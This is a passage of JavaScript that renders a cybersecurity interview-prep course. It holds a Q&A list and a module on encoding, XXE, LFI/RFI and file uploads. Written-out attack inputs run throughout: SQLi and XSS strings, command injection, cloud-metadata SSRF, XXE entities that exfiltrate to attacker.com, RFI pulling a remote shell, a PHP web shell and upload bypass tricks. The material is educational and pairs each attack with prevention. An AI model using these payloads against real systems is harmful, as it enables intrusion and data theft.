    ${qa(12, 'What is the difference between a Firewall, IDS, and IPS?', '<strong>Firewall:</strong> Filters traffic based on rules (IP, port, protocol). Like a gatekeeper.<br><strong>IDS (Intrusion Detection System):</strong> Monitors and ALERTS on suspicious activity. Passive — like a security camera.<br><strong>IPS (Intrusion Prevention System):</strong> Monitors, ALERTS, and BLOCKS threats. Active — like a security guard.<br><strong>WAF:</strong> Web Application Firewall — specifically protects web apps at Layer 7 from XSS, SQLi, etc.')}
    ${qa(13, 'Name important ports you should know.', '20/21 — FTP (data/control)<br>22 — SSH (secure remote access)<br>23 — Telnet (insecure, plaintext)<br>25 — SMTP (email sending)<br>53 — DNS<br>80 — HTTP<br>443 — HTTPS<br>3306 — MySQL<br>3389 — RDP (Remote Desktop)<br>8080 — HTTP Alternative/Proxy')}
    ${qa(14, 'What is ARP Spoofing?', 'ARP maps IP addresses to MAC addresses on a local network. In ARP Spoofing, an attacker sends fake ARP replies to associate their MAC address with a legitimate IP (like the gateway). This allows them to intercept traffic as a Man-in-the-Middle (MITM). Prevention: Static ARP entries, Dynamic ARP Inspection (DAI), use encrypted protocols.')}
    ${qa(15, 'What is a VPN and how does it work?', 'A VPN (Virtual Private Network) creates an encrypted tunnel between your device and a VPN server. All traffic passes through this tunnel, hiding your real IP and encrypting data. It protects against eavesdropping on public WiFi and provides anonymity. Protocols: OpenVPN, WireGuard, IPSec, L2TP.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">⚔️</span> Attacks & Vulnerabilities</h2>
    ${qa(16, 'What is SQL Injection? How do you prevent it?', '<strong>What:</strong> Attacker injects malicious SQL code through user input to manipulate database queries.<br><strong>Example:</strong> Login field: <code>admin\' OR 1=1 --</code> bypasses authentication.<br><strong>Harm:</strong> Read/modify/delete entire database, bypass login, execute OS commands.<br><strong>Prevention:</strong><br>1. <strong>Parameterized queries / Prepared statements</strong> (most important!)<br>2. Input validation and sanitization<br>3. Use ORM frameworks<br>4. Least privilege database accounts<br>5. WAF rules')}
    ${qa(17, 'What is XSS? Explain all types.', '<strong>Cross-Site Scripting</strong> — injecting malicious JavaScript into web pages.<br><br><strong>Reflected XSS:</strong> Payload in URL, reflected back in response. Non-persistent. Example: <code>search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code><br><br><strong>Stored XSS:</strong> Payload saved in database (e.g., comment), executed for ALL visitors. Most dangerous.<br><br><strong>DOM-based XSS:</strong> Payload manipulates client-side DOM via JavaScript, never touches the server.<br><br><strong>Prevention:</strong> Output encoding, CSP header, HttpOnly cookies, input validation, use auto-escaping frameworks.')}
    ${qa(18, 'What is CSRF and how does it work?', '<strong>Cross-Site Request Forgery</strong> tricks a logged-in user into making unintended requests.<br><strong>How:</strong> Attacker creates a page with a hidden form that submits to the target site. When the victim visits it, their browser automatically includes their session cookies, authenticating the malicious request.<br><strong>Example:</strong> Hidden form that transfers money from victim\'s bank account.<br><strong>Prevention:</strong> Anti-CSRF tokens, SameSite cookie attribute, re-authentication for sensitive actions, check Referer header.')}
    ${qa(19, 'What is IDOR?', '<strong>Insecure Direct Object Reference</strong> — application exposes internal references (user IDs, file names, database keys) that users can manipulate to access unauthorized resources.<br><strong>Example:</strong> <code>/api/user/123/profile</code> → change to <code>/api/user/124/profile</code> to see another user\'s data.<br><strong>Prevention:</strong> Always verify the authenticated user is authorized to access the requested resource. Use UUIDs instead of sequential IDs. Implement proper access control.')}
    ${qa(20, 'What is SSRF?', '<strong>Server-Side Request Forgery</strong> — tricking the server into making requests to unintended locations (internal services, cloud metadata).<br><strong>Example:</strong> <code>/fetch?url=http://169.254.169.254/latest/meta-data/</code> — accesses AWS metadata from within the server.<br><strong>Prevention:</strong> Whitelist allowed URLs/domains, block internal/private IP ranges, validate and sanitize URLs, don\'t return raw responses.')}
    ${qa(21, 'What is Command Injection?', 'Application passes user input to OS commands without sanitization.<br><strong>Example:</strong> Ping feature: user inputs <code>8.8.8.8; cat /etc/passwd</code> — server executes both commands.<br><strong>Operators:</strong> <code>;</code> (sequential), <code>&&</code> (AND), <code>||</code> (OR), <code>|</code> (pipe), backticks<br><strong>Prevention:</strong> Never pass user input to shell commands. Use language APIs instead. If unavoidable, strict input validation with allowlists.')}
    ${qa(22, 'What is a Man-in-the-Middle (MITM) attack?', 'Attacker positions themselves between two communicating parties to intercept, read, or modify traffic.<br><strong>Methods:</strong> ARP Spoofing, DNS Spoofing, Rogue WiFi hotspot, SSL Stripping.<br><strong>Prevention:</strong> Use HTTPS everywhere, HSTS header (prevents downgrade to HTTP), certificate pinning, VPN on public WiFi, verify SSL certificates.')}
    ${qa(23, 'What is a DDoS attack?', '<strong>Distributed Denial of Service</strong> — overwhelming a server with massive traffic from multiple sources to make it unavailable.<br><strong>Types:</strong> Volumetric (SYN Flood, UDP Flood), Protocol (Ping of Death, Smurf), Application Layer (HTTP Flood, Slowloris).<br><strong>Prevention:</strong> CDN/DDoS protection (Cloudflare, AWS Shield), rate limiting, traffic analysis, geo-blocking, load balancing.')}
    ${qa(24, 'Explain session hijacking vs session fixation.', '<strong>Session Hijacking:</strong> Stealing an active session token to impersonate a user. Methods: XSS (document.cookie), network sniffing, MITM.<br><strong>Session Fixation:</strong> Attacker sets a known session ID for the victim BEFORE they log in. After victim authenticates, attacker uses that same session ID.<br><strong>Prevention:</strong> Regenerate session ID after login, HttpOnly + Secure cookie flags, short session timeouts, bind session to IP.')}
    ${qa(25, 'What is clickjacking?', 'Attacker loads the target website in a transparent iframe overlaid on a malicious page. The user thinks they\'re clicking on the malicious page but actually interacts with the hidden target site.<br><strong>Example:</strong> User thinks they\'re clicking "Play Video" but actually clicks "Delete Account" on the hidden iframe.<br><strong>Prevention:</strong> <code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code>, <code>Content-Security-Policy: frame-ancestors \'none\'</code>')}
    ${qa(26, 'What is directory traversal?', 'Accessing files outside the intended directory by using <code>../</code> sequences.<br><strong>Example:</strong> <code>/download?file=../../../etc/passwd</code><br><strong>Prevention:</strong> Validate file paths, use allowlists, resolve canonical paths and check they\'re within allowed directories, never expose file system paths in URLs.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📋</span> OWASP & Web Security</h2>
    ${qa(27, 'What is OWASP? Name the Top 10.', 'OWASP = Open Web Application Security Project. A nonprofit that produces security standards and tools.<br><strong>OWASP Top 10 (2021):</strong><br>A01: Broken Access Control<br>A02: Cryptographic Failures<br>A03: Injection<br>A04: Insecure Design<br>A05: Security Misconfiguration<br>A06: Vulnerable & Outdated Components<br>A07: Identification & Authentication Failures<br>A08: Software & Data Integrity Failures<br>A09: Security Logging & Monitoring Failures<br>A10: Server-Side Request Forgery (SSRF)')}
    ${qa(28, 'What are important HTTP security headers?', '<code>Content-Security-Policy (CSP)</code> — Controls which resources can load (prevents XSS)<br><code>X-Frame-Options</code> — Prevents clickjacking (DENY/SAMEORIGIN)<br><code>Strict-Transport-Security (HSTS)</code> — Forces HTTPS<br><code>X-Content-Type-Options: nosniff</code> — Prevents MIME sniffing<br><code>X-XSS-Protection</code> — Browser XSS filter (deprecated but still seen)<br><code>Referrer-Policy</code> — Controls referrer information<br><code>Permissions-Policy</code> — Controls browser features (camera, mic, etc.)')}
    ${qa(29, 'Explain cookie security flags.', '<code>HttpOnly</code> — Cookie cannot be accessed by JavaScript (document.cookie). Prevents XSS from stealing session cookies.<br><code>Secure</code> — Cookie only sent over HTTPS. Prevents interception over HTTP.<br><code>SameSite</code> — Controls cross-site cookie sending. Values: Strict (never cross-site), Lax (safe methods only), None (always, requires Secure).<br><code>Domain</code> — Specifies which domains receive the cookie.<br><code>Path</code> — Limits cookie to specific URL paths.<br><code>Max-Age/Expires</code> — Cookie expiration.')}
    ${qa(30, 'What is CORS and why is it important?', '<strong>Cross-Origin Resource Sharing</strong> — a mechanism that allows browsers to make cross-origin HTTP requests. By default, browsers block cross-origin requests (Same-Origin Policy).<br>CORS headers on the server specify which origins can access resources.<br><strong>Misconfiguration:</strong> <code>Access-Control-Allow-Origin: *</code> allows ANY website to access the API — potential data theft.<br><strong>Secure config:</strong> Whitelist specific trusted origins only.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔧</span> Tools & Linux</h2>
    ${qa(31, 'What is Burp Suite and how do you use it?', 'Burp Suite is an intercepting proxy for web application security testing. Key components:<br><strong>Proxy:</strong> Intercept and modify HTTP traffic between browser and server<br><strong>Repeater:</strong> Manually modify and resend requests (test SQLi, XSS)<br><strong>Intruder:</strong> Automated attacks — brute force, fuzzing, parameter testing<br><strong>Scanner:</strong> Automated vulnerability scanner (Pro only)<br><strong>Decoder:</strong> Encode/decode Base64, URL, HTML<br>Setup: Configure browser proxy to 127.0.0.1:8080, install Burp CA certificate for HTTPS interception.')}
    ${qa(32, 'Explain key NMAP scan types.', '<code>nmap -sS</code> — SYN Scan (stealth): Sends SYN, receives SYN-ACK, sends RST. Never completes handshake.<br><code>nmap -sT</code> — TCP Connect: Full handshake. More reliable but more detectable.<br><code>nmap -sU</code> — UDP Scan: Scans UDP ports. Slow but important.<br><code>nmap -sV</code> — Version Detection: Identifies service versions on open ports.<br><code>nmap -O</code> — OS Detection: Identifies operating system.<br><code>nmap -A</code> — Aggressive: Combines OS, version, scripts, traceroute.<br><code>nmap -p-</code> — Scans ALL 65535 ports.<br><code>nmap -sn</code> — Ping sweep: Discover live hosts, no port scan.')}
    ${qa(33, 'What is Kali Linux?', 'Kali Linux is a Debian-based distribution designed specifically for penetration testing and security auditing. Maintained by Offensive Security. Comes pre-installed with 600+ security tools including NMAP, Burp Suite, Metasploit, Wireshark, sqlmap, Hydra, John the Ripper, Aircrack-ng, and many more. It is the industry standard OS for cybersecurity professionals.')}
    ${qa(34, 'What Linux commands are important for security?', 'File operations: <code>ls -la, cat, grep, find, chmod, chown</code><br>Network: <code>ifconfig, ip addr, ping, traceroute, netstat -tulnp, ss, nslookup, dig, curl, wget, arp -a</code><br>User/Process: <code>whoami, id, ps aux, top, kill, crontab</code><br>Security files: <code>/etc/passwd</code> (users), <code>/etc/shadow</code> (password hashes), <code>/var/log/auth.log</code> (auth logs)<br>Encoding: <code>base64, md5sum, sha256sum</code><br>Networking: <code>nc (netcat), ssh, scp</code>')}
    ${qa(35, 'What is sqlmap?', 'sqlmap is an open-source tool that automates SQL injection detection and exploitation. Usage:<br><code>sqlmap -u "http://target.com/page?id=1" --dbs</code> — Find databases<br><code>sqlmap -u "URL" -D dbname --tables</code> — List tables<br><code>sqlmap -u "URL" -D db -T users --dump</code> — Dump table data<br>It supports multiple database engines: MySQL, PostgreSQL, MSSQL, Oracle, SQLite.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📝</span> VAPT & Process</h2>
    ${qa(36, 'What is VAPT?', '<strong>VAPT = Vulnerability Assessment + Penetration Testing.</strong><br><strong>VA:</strong> Broad, automated scanning to identify and list all vulnerabilities. Tools: Nessus, OpenVAS, Qualys.<br><strong>PT:</strong> Deep, manual testing to actively exploit vulnerabilities and demonstrate real-world impact. Tools: Burp Suite, Metasploit, manual testing.<br>Together they provide comprehensive security assessment.')}
    ${qa(37, 'What are the phases of penetration testing?', '1. <strong>Planning & Scoping:</strong> Define scope, get authorization, agree on rules of engagement<br>2. <strong>Reconnaissance:</strong> Gather information (passive: WHOIS, Google; active: NMAP, scanning)<br>3. <strong>Scanning & Enumeration:</strong> Port scanning, service detection, vulnerability scanning<br>4. <strong>Exploitation:</strong> Attempt to exploit found vulnerabilities, document with evidence<br>5. <strong>Reporting:</strong> Document findings with severity, impact, reproduction steps, and remediation recommendations')}
    ${qa(38, 'What is the difference between Black Box, White Box, and Grey Box testing?', '<strong>Black Box:</strong> No prior knowledge of the system. Simulates an external attacker. Most realistic but time-consuming.<br><strong>White Box:</strong> Full knowledge — source code, architecture, credentials. Most thorough. Simulates insider threat/code review.<br><strong>Grey Box:</strong> Partial knowledge — user credentials, some documentation. Simulates an authenticated user attack. Most common for web app testing.')}
    ${qa(39, 'What should a VAPT report contain?', '1. <strong>Executive Summary:</strong> High-level overview for management<br>2. <strong>Scope & Methodology:</strong> What was tested and how<br>3. <strong>Findings Summary:</strong> Table with vulnerability names and severity ratings<br>4. <strong>Detailed Findings:</strong> For each vulnerability — Description, Severity (CVSS), Impact, Steps to Reproduce, Screenshots/Evidence, Remediation<br>5. <strong>Recommendations:</strong> Prioritized fixes<br>6. <strong>Appendix:</strong> Tool outputs, raw data')}
    ${qa(40, 'What is CVSS?', '<strong>Common Vulnerability Scoring System</strong> — standardized framework for rating vulnerability severity.<br>Scale: 0-10<br>Critical: 9.0-10.0 (RCE, auth bypass)<br>High: 7.0-8.9 (stored XSS, IDOR)<br>Medium: 4.0-6.9 (CSRF, reflected XSS)<br>Low: 0.1-3.9 (missing headers, info disclosure)<br>Factors: Attack vector, complexity, privileges required, user interaction, impact on CIA.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🧠</span> Scenario-Based Questions</h2>
    ${qa(41, 'You find a login page. How would you test it for vulnerabilities?', '1. <strong>SQL Injection:</strong> Try <code>admin\' OR 1=1 --</code> in username/password fields. Use Burp Repeater with various payloads.<br>2. <strong>Brute Force:</strong> Check for rate limiting. Try common passwords with Burp Intruder or Hydra.<br>3. <strong>XSS:</strong> Try <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in input fields.<br>4. <strong>Default Credentials:</strong> Try admin/admin, admin/password, test/test.<br>5. <strong>Account Enumeration:</strong> Check if error messages differ for valid vs invalid usernames.<br>6. <strong>Session Management:</strong> Check if session token changes after login, check cookie flags.<br>7. <strong>HTTPS:</strong> Verify credentials are sent over HTTPS, not HTTP.<br>8. <strong>CSRF:</strong> Check for anti-CSRF token on login form.<br>9. <strong>Password Policy:</strong> Test if weak passwords are accepted.<br>10. <strong>Lockout:</strong> Check if account locks after multiple failed attempts.')}
    ${qa(42, 'A user reports they can see another user\'s data. What do you check?', 'This is likely an <strong>IDOR (Insecure Direct Object Reference)</strong> or <strong>Broken Access Control</strong> issue.<br>1. Check if the API/URL uses sequential IDs (e.g., /user/123 → /user/124)<br>2. Verify if the server checks that the authenticated user owns the requested resource<br>3. Check if authorization is only done on the frontend (can be bypassed)<br>4. Test with different user roles to see if access control is properly enforced<br>5. Check for horizontal privilege escalation (same role, different user) and vertical (different role levels)<br>6. Document the vulnerability with exact steps to reproduce, impact assessment, and recommend implementing proper server-side authorization checks.')}
    ${qa(43, 'You find an XSS vulnerability on a website. What\'s the impact and how do you report it?', '<strong>Impact:</strong> Session hijacking (steal cookies), keylogging, phishing (modify page content), malware distribution, website defacement, CSRF bypass.<br><strong>Report:</strong><br>- Title: Stored/Reflected XSS in [location]<br>- Severity: High (Stored) / Medium (Reflected)<br>- Description: User input at [field] is reflected without sanitization<br>- Steps to Reproduce: 1) Navigate to page, 2) Enter payload: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, 3) Submit, 4) Observe script execution<br>- Evidence: Screenshots showing alert box with cookie<br>- Remediation: Implement output encoding, add CSP header, add HttpOnly flag to session cookies')}
    ${qa(44, 'A company asks you to do a pentest. What do you do first?', '1. <strong>Get written authorization</strong> — Never test without explicit permission (it\'s illegal otherwise)<br>2. <strong>Define scope</strong> — Which systems/applications/IPs are in scope<br>3. <strong>Rules of Engagement</strong> — Testing hours, allowed techniques, out-of-scope items, emergency contacts<br>4. <strong>Identify testing type</strong> — Black Box, White Box, or Grey Box<br>5. <strong>Set up testing environment</strong> — Kali Linux, Burp Suite, NMAP, custom scripts<br>6. <strong>Begin with passive reconnaissance</strong> — OSINT, WHOIS, DNS records<br>Never start active scanning without all approvals in place.')}
    ${qa(45, 'How would you secure a web application?', '1. <strong>Input Validation:</strong> Validate and sanitize ALL user inputs (server-side)<br>2. <strong>Parameterized Queries:</strong> Prevent SQL injection<br>3. <strong>Output Encoding:</strong> Prevent XSS<br>4. <strong>Authentication:</strong> Strong passwords, MFA, rate limiting, account lockout<br>5. <strong>Authorization:</strong> RBAC, server-side access control checks on every request<br>6. <strong>HTTPS Everywhere:</strong> TLS 1.2+ with proper certificates<br>7. <strong>Security Headers:</strong> CSP, HSTS, X-Frame-Options, X-Content-Type-Options<br>8. <strong>Cookie Security:</strong> HttpOnly, Secure, SameSite flags<br>9. <strong>Updates:</strong> Keep all components patched and up-to-date<br>10. <strong>Logging:</strong> Log all security events, monitor for anomalies<br>11. <strong>Error Handling:</strong> Generic error messages, no stack traces<br>12. <strong>CSRF Protection:</strong> Anti-CSRF tokens')}
    ${qa(46, 'What would you do if you find a critical vulnerability during a pentest?', '1. <strong>Document it immediately</strong> with detailed evidence (screenshots, request/response)<br>2. <strong>Notify the client ASAP</strong> — don\'t wait for the final report for critical issues<br>3. <strong>Assess the impact</strong> — what data is at risk, what systems are affected<br>4. <strong>Provide immediate remediation advice</strong><br>5. <strong>Stop further exploitation</strong> — don\'t extract more data than necessary to prove the vulnerability<br>6. <strong>Include in final report</strong> with full details and priority remediation timeline')}
    ${qa(47, 'Explain how you would test an API for security issues.', '1. <strong>Authentication:</strong> Test with no token, expired token, manipulated token (JWT attacks)<br>2. <strong>Authorization/IDOR:</strong> Change user IDs, resource IDs in requests<br>3. <strong>Input Validation:</strong> Send unexpected data types, extra-long strings, special characters<br>4. <strong>SQL Injection:</strong> Test all parameters with SQLi payloads<br>5. <strong>Rate Limiting:</strong> Send many requests rapidly<br>6. <strong>CORS:</strong> Check Access-Control-Allow-Origin headers<br>7. <strong>HTTP Methods:</strong> Try PUT, DELETE, PATCH on read-only endpoints<br>8. <strong>Error Handling:</strong> Check if errors reveal sensitive information<br>9. <strong>Data Exposure:</strong> Check if responses include more data than needed<br>10. Use Burp Suite and Postman for testing.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">💼</span> About Kratikal — Interview Tips</h2>
    ${qa(48, 'What does Kratikal do?', 'Kratikal Tech Limited is a leading B2B cybersecurity firm offering:<br>- <strong>Services:</strong> VAPT (Vulnerability Assessment & Penetration Testing), Network Security Audits, Compliance Implementation, IoT Security<br>- <strong>Products:</strong> AutoSecT (automated security testing), TSAT (Threatcop Security Awareness Training), TDMARC (DMARC), TLMS (Learning Management System), TPIR (Phishing Incident Response)<br>- <strong>Clients:</strong> 150+ enterprises, 1825+ SMEs across E-commerce, Fintech, BFSI, NBFC, Telecom, Healthcare, Manufacturing<br>- Websites: kratikal.com, threatcop.com<br>- Award: Top Cyber Security Startup at 12th Top 100 CISO Awards')}
    ${qa(49, 'Why do you want to work at Kratikal?', 'Suggested answer: "Kratikal offers a unique structured 3-year program that combines hands-on VAPT experience with industry certifications like CEH and CRT. I\'m excited about working on real client projects from day one, learning from experienced security analysts, and growing from intern to a specialized security professional. The company\'s position as a leader in cybersecurity with products like AutoSecT and Threatcop, and serving clients across diverse industries, means I\'ll get exposure to varied security challenges. The clear career progression path with salary growth and certification support shows Kratikal genuinely invests in talent development."')}
    ${qa(50, 'Where do you see yourself in 3 years?', 'Suggested answer: "In 3 years, I see myself as a skilled VAPT professional at Kratikal, having earned my CEH and CRT certifications. I want to specialize in application security testing, be capable of leading security assessments independently, and potentially mentor junior team members. The structured program at Kratikal aligns perfectly with this growth trajectory."')}
  </div>

  ${keyPoints([
    'For every attack question: explain What → How → Harm → Prevention',
    'Login page testing: SQLi, brute force, XSS, default creds, session mgmt, enumeration',
    'Know Burp Suite workflow: Intercept → Repeater → Intruder',
    'Know NMAP scan types: -sS (stealth), -sV (version), -A (aggressive)',
    'VAPT phases: Plan → Recon → Scan → Exploit → Report',
    'Know Kratikal products: AutoSecT, TSAT, TDMARC, TLMS, TPIR',
    'Mention practical tools you know: Burp, NMAP, sqlmap, Wireshark, Kali',
    'Always mention prevention/remediation — shows you think like a defender too'
  ])}

  ${moduleFooter('mod9', 'mod8', null)}`;
}


// ============ MODULE 6B: Additional Attacks ============
// Add Module 6B to the MODULES array
MODULES.splice(6, 0, {
  id: 'mod6b',
  title: 'Advanced Attacks & Concepts',
  icon: '🧬',
  time: '3 hrs',
  desc: 'XXE, LFI/RFI, file upload, deserialization, SSTI, privilege escalation, encoding vs encryption, and more.',
  content: () => renderModule6B()
});

// Fix module 7-9 references (they shifted)
// Update total count display

function renderModule6B() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 06B · 3 hrs</div>
    <h1>🧬 Advanced Attacks & Missing Concepts</h1>
    <p class="module-desc">Every attack from PortSwigger Web Security Academy plus the topics specifically requested: XXE, LFI/RFI, File Upload, Deserialization, SSTI, Privilege Escalation, Encoding vs Encryption, Process Hijacking, and more.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> Encoding vs Encryption (Detailed)</h2>
    <p>This is a <strong>commonly confused topic</strong> in interviews. Know the difference clearly.</p>

    <table class="comparison-table">
      <tr><th>Aspect</th><th>Encoding</th><th>Encryption</th><th>Hashing</th></tr>
      <tr><td><strong>Purpose</strong></td><td>Transform data format for compatibility</td><td>Protect data confidentiality</td><td>Verify data integrity</td></tr>
      <tr><td><strong>Reversible?</strong></td><td>✅ Yes (no key needed)</td><td>✅ Yes (with key)</td><td>❌ No (one-way)</td></tr>
      <tr><td><strong>Security?</strong></td><td>❌ NOT for security</td><td>✅ For security</td><td>✅ For security</td></tr>
      <tr><td><strong>Key needed?</strong></td><td>No</td><td>Yes</td><td>No</td></tr>
      <tr><td><strong>Examples</strong></td><td>Base64, URL encoding, HTML encoding, ASCII, Unicode</td><td>AES, RSA, DES, 3DES, Blowfish</td><td>MD5, SHA-256, bcrypt, argon2</td></tr>
      <tr><td><strong>Use case</strong></td><td>Data transmission, URL params, email attachments</td><td>Protecting passwords in transit, file encryption, HTTPS</td><td>Password storage, file integrity, digital signatures</td></tr>
    </table>

    ${terminal('Encoding Examples', `<span class="comment"># Base64 Encoding (NOT encryption!)</span>
<span class="cmd">echo -n "admin:password" | base64</span>
<span class="output">YWRtaW46cGFzc3dvcmQ=</span>
<span class="cmd">echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d</span>
<span class="output">admin:password</span>

<span class="comment"># URL Encoding</span>
<span class="highlight">Space → %20    < → %3C    > → %3E    " → %22    ' → %27</span>
<span class="highlight">/ → %2F    \\ → %5C    & → %26    = → %3D    ? → %3F</span>
<span class="string">hello world → hello%20world</span>
<span class="string">&lt;script&gt; → %3Cscript%3E</span>

<span class="comment"># HTML Encoding</span>
<span class="highlight">< → &lt;    > → &gt;    & → &amp;    " → &quot;    ' → &#x27;</span>
<span class="comment"># Used to prevent XSS — browser renders as text, not HTML</span>

<span class="comment"># Hex Encoding</span>
<span class="string">"A" → 0x41    "hello" → 68 65 6c 6c 6f</span>`)}

    ${conceptCard('danger', '🔴 Critical Interview Point', '<p><strong>Base64 is NOT encryption!</strong> It is encoding — anyone can decode it without a key. Never use Base64 to "protect" passwords or sensitive data. Interviewers specifically test this. If you see credentials in Base64 during a pentest, they are essentially in plaintext.</p>')}

    <h3>Symmetric vs Asymmetric Encryption (Detailed)</h3>
    <table class="comparison-table">
      <tr><th>Feature</th><th>Symmetric</th><th>Asymmetric</th></tr>
      <tr><td><strong>Keys</strong></td><td>One shared key for encrypt & decrypt</td><td>Key pair: Public (encrypt) + Private (decrypt)</td></tr>
      <tr><td><strong>Speed</strong></td><td>Fast — used for bulk data</td><td>Slow — used for small data, key exchange</td></tr>
      <tr><td><strong>Key Distribution</strong></td><td>Problem: how to share key securely?</td><td>Public key can be shared openly</td></tr>
      <tr><td><strong>Algorithms</strong></td><td>AES-256 (best), DES (broken), 3DES (legacy), Blowfish</td><td>RSA-2048+, ECC, Diffie-Hellman</td></tr>
      <tr><td><strong>Use Case</strong></td><td>File encryption, database encryption, VPN tunnels</td><td>HTTPS/TLS handshake, digital signatures, SSH keys, PGP email</td></tr>
    </table>

    ${conceptCard('highlight', '💡 How HTTPS Uses Both', '<p>HTTPS uses <strong>asymmetric encryption</strong> during the TLS handshake to securely exchange a <strong>symmetric key</strong>. Then all data is encrypted with the faster symmetric key (AES). This is called <strong>hybrid encryption</strong> — best of both worlds.</p>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📄</span> XXE (XML External Entity) Injection</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>Exploits XML parsers that process external entity references. If the application parses XML input and the parser is configured to resolve external entities, an attacker can read files, perform SSRF, or cause DoS.</p>

    ${terminal('XXE Attack Examples', `<span class="comment"># 1. Read local files</span>
<span class="warning">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;&lt;name&gt;&xxe;&lt;/name&gt;&lt;/user&gt;</span>
<span class="comment"># The server replaces &xxe; with contents of /etc/passwd</span>

<span class="comment"># 2. SSRF via XXE (access internal services)</span>
<span class="warning">&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;</span>

<span class="comment"># 3. Blind XXE with out-of-band data exfiltration</span>
<span class="warning">&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd"&gt;
]&gt;</span>

<span class="comment"># 4. DoS via Billion Laughs Attack</span>
<span class="warning">&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"&gt;
  &lt;!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"&gt;
]&gt;</span>
<span class="comment"># Exponential entity expansion causes memory exhaustion (DoS)</span>`)}

    <p><strong>Where XXE occurs:</strong> Any endpoint accepting XML — SOAP APIs, XML file uploads, SVG uploads, SAML authentication, RSS feeds.</p>

    ${conceptCard('success', '✅ Prevention', '<ul><li>Disable external entity processing in XML parser (most important)</li><li>Use JSON instead of XML where possible</li><li>Validate and sanitize XML input</li><li>Use less complex data formats (JSON is safer by default)</li><li>Keep XML libraries updated</li></ul>')}

    ${quiz('q_xxe', 'An attacker uploads an SVG file containing &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;. What type of attack is this?', ['XSS', 'XXE Injection', 'SQL Injection', 'File Upload Vulnerability'], 1, 'SVG files are XML-based. If the server parses the SVG with an XML parser that allows external entities, the attacker can read server files via XXE.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📂</span> LFI & RFI (Local/Remote File Inclusion)</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>

    <table class="comparison-table">
      <tr><th>Type</th><th>What It Does</th><th>Example</th></tr>
      <tr><td><strong>LFI</strong> (Local File Inclusion)</td><td>Include files from the LOCAL server</td><td><code>page.php?file=../../../etc/passwd</code></td></tr>
      <tr><td><strong>RFI</strong> (Remote File Inclusion)</td><td>Include files from a REMOTE server</td><td><code>page.php?file=http://evil.com/shell.php</code></td></tr>
    </table>

    ${terminal('LFI/RFI Examples', `<span class="comment"># Vulnerable PHP code:</span>
<span class="warning">&lt;?php include($_GET['page']); ?&gt;</span>

<span class="comment"># LFI — Read local files:</span>
<span class="cmd">GET /index.php?page=../../../etc/passwd</span>
<span class="cmd">GET /index.php?page=../../../etc/shadow</span>
<span class="cmd">GET /index.php?page=../../../var/log/auth.log</span>

<span class="comment"># LFI with NULL byte (older PHP):</span>
<span class="cmd">GET /index.php?page=../../../etc/passwd%00</span>

<span class="comment"># LFI with PHP wrappers:</span>
<span class="cmd">GET /index.php?page=php://filter/convert.base64-encode/resource=config.php</span>
<span class="comment"># Returns base64 encoded source code of config.php!</span>

<span class="comment"># RFI — Include remote malicious file:</span>
<span class="cmd">GET /index.php?page=http://attacker.com/shell.php</span>
<span class="comment"># Executes attacker's PHP code on the server → Remote Code Execution!</span>

<span class="comment"># LFI to RCE via Log Poisoning:</span>
<span class="comment"># 1. Inject PHP code in User-Agent header</span>
<span class="comment"># 2. Include the access log file via LFI</span>
<span class="comment"># 3. PHP code in log gets executed</span>`)}

    <p><strong>LFI vs Path Traversal:</strong> Path traversal reads files; LFI actually <em>includes and executes</em> them (in PHP), potentially leading to RCE.</p>

    ${conceptCard('success', '✅ Prevention', '<ul><li>Never include files based on user input</li><li>Use a whitelist of allowed files/pages</li><li>Disable <code>allow_url_include</code> in PHP config (prevents RFI)</li><li>Use proper input validation — strip ../ and URL patterns</li><li>Chroot or containerize the application</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📤</span> File Upload Vulnerabilities</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>If file upload is not properly validated, attackers can upload malicious files (web shells, malware).</p>

    ${caseStudy('Web Shell Upload on Profile Picture', `
      <p><strong>Scenario:</strong> A website allows users to upload profile pictures at <code>/upload</code></p>
      <p><strong>Attack:</strong> Instead of uploading image.jpg, attacker uploads <code>shell.php</code> containing:</p>
      <div class="terminal-block"><div class="terminal-body"><span class="warning">&lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="comment"># After upload, access:</span>
<span class="cmd">GET /uploads/shell.php?cmd=whoami</span>
<span class="output">www-data</span>

<span class="cmd">GET /uploads/shell.php?cmd=cat /etc/passwd</span>
<span class="comment"># Full Remote Code Execution!</span></div></div>
      <p><strong>Bypass techniques:</strong></p>
      <ul>
        <li>Change extension: <code>shell.php.jpg</code>, <code>shell.pHp</code>, <code>shell.php5</code></li>
        <li>Change Content-Type header to <code>image/jpeg</code></li>
        <li>Add magic bytes (JPEG header) before PHP code</li>
        <li>Use double extensions: <code>shell.php.jpg</code></li>
        <li>Null byte: <code>shell.php%00.jpg</code></li>
      </ul>
      <p><strong>Prevention:</strong></p>
      <ul>
